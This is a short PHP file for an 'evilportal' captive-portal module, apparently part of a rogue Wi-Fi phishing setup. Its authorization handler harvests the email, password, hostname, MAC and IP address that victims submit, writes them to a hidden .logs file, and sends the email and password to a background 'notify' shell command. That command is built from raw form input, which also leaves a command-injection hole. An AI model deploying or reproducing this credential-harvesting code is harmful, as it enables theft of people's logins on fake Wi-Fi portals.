<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
      if (isset($_POST['email'])) {
          $email = isset($_POST['email']) ? $_POST['email'] : 'email';
          $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
          $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
          $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
          $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';

          $reflector = new \ReflectionClass(get_class($this));
          $logPath = dirname($reflector->getFileName());
          file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
          $this->execBackground("notify $email' - '$pwd");
      }
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
